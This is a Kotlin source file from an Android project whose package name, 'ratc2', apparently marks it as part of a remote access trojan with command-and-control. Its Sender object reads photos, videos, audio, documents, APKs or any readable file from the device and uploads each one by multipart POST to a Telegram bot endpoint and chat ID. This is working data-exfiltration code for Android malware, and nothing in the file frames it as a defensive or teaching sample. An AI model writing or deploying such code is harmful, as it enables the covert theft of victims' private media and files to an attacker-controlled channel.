package com.spud.ratc2

import android.util.Log
import java.io.File
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID

object Sender {
    private const val TAG = "SENDER"

    fun get(url: String): String {
        val c = URL(url).openConnection() as HttpURLConnection
        c.connectTimeout = 15000
        c.readTimeout = 35000
        return c.inputStream.bufferedReader().readText()
    }

    fun post(url: String, params: String): String {
        val c = URL(url).openConnection() as HttpURLConnection
        c.connectTimeout = 15000
        c.readTimeout = 35000
        c.requestMethod = "POST"
        c.doOutput = true
        c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        c.outputStream.write(params.toByteArray())
        return c.inputStream.bufferedReader().readText()
    }

    fun sendDocument(botBase: String, chatId: String, filename: String, content: String): Boolean =
        sendFile(botBase, chatId, "sendDocument", "document", filename, content.toByteArray(Charsets.UTF_8), "text/plain; charset=utf-8")

    fun sendPhoto(botBase: String, chatId: String, path: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead()) return false
        if (f.length() > 10L * 1024 * 1024) return false
        return sendFile(botBase, chatId, "sendPhoto", "photo", f.name, f.readBytes(), guessMime(f.name))
    }

    fun sendVideo(botBase: String, chatId: String, path: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead()) return false
        if (f.length() > 50L * 1024 * 1024) return false
        return sendFile(botBase, chatId, "sendVideo", "video", f.name, f.readBytes(), "video/mp4")
    }

    fun sendAudio(botBase: String, chatId: String, path: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead()) return false
        if (f.length() > 50L * 1024 * 1024) return false
        return sendFile(botBase, chatId, "sendAudio", "audio", f.name, f.readBytes(), guessMime(f.name))
    }

    private fun guessMime(name: String): String {
        val n = name.lowercase()
        return when {
            n.endsWith(".mp3") -> "audio/mpeg"
            n.endsWith(".m4a") -> "audio/mp4"
            n.endsWith(".wav") -> "audio/wav"
            n.endsWith(".ogg") -> "audio/ogg"
            n.endsWith(".jpg") || n.endsWith(".jpeg") -> "image/jpeg"
            n.endsWith(".png") -> "image/png"
            n.endsWith(".gif") -> "image/gif"
            n.endsWith(".webp") -> "image/webp"
            n.endsWith(".mp4") -> "video/mp4"
            else -> "application/octet-stream"
        }
    }

    private fun sendFile(base: String, chatId: String, endpoint: String, field: String, filename: String, data: ByteArray, mime: String): Boolean {
        return try {
            val boundary = "----Spud" + UUID.randomUUID().toString().replace("-", "")
            val conn = URL("$base/$endpoint").openConnection() as HttpURLConnection
            conn.connectTimeout = 20000
            conn.readTimeout = 180000
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

            val out: OutputStream = conn.outputStream
            fun w(s: String) { out.write(s.toByteArray(Charsets.UTF_8)) }

            w("--$boundary\r\n")
            w("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
            w("$chatId\r\n")

            w("--$boundary\r\n")
            w("Content-Disposition: form-data; name=\"$field\"; filename=\"${filename.replace("\"", "")}\"\r\n")
            w("Content-Type: $mime\r\n\r\n")
            out.write(data)
            w("\r\n")

            w("--$boundary--\r\n")
            out.flush()
            out.close()

            val code = conn.responseCode
            Log.i(TAG, "$endpoint code=$code size=${data.size}")
            code in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "$endpoint error", e)
            false
        }
    }

    fun sendAnyFile(botBase: String, chatId: String, path: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead() || f.length() == 0L) return false
        if (f.length() > 50L * 1024 * 1024) return false
        return sendFile(botBase, chatId, "sendDocument", "document", f.name, f.readBytes(), guessMime(f.name))
    }

    fun sendApk(botBase: String, chatId: String, path: String, displayName: String): Boolean {
        val f = File(path)
        if (!f.exists() || !f.canRead()) return false
        if (f.length() > 50L * 1024 * 1024) return false
        return sendFile(botBase, chatId, "sendDocument", "document", displayName, f.readBytes(), "application/vnd.android.package-archive")
    }
}
